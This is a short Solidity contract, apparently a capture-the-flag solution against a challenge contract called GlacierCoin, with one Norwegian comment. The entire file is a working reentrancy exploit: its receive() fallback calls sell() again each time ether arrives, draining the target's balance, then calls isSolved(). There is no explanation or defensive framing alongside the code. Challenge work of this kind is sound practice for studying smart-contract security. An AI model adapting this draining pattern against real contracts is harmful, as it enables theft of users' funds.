// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface GlacierCoin {
    function sell(uint256 amount) external;
}

contract Exploit {
    GlacierCoin public target;

    constructor(address _target) {
        target = GlacierCoin(_target);
    }

    // Fallback når kontrakt får eth
    receive() external payable {
        target.sell(1 ether);
        if (address(target).balance == 0) {
            (bool success, ) = address(target).call(abi.encodeWithSignature("isSolved()"));
            require(success, "Exploit failed");
        }
    }

    function startExploit() external payable {
        require(msg.value > 0, "Send some Ether to start the exploit");
        target.sell(1 ether);
    }
}
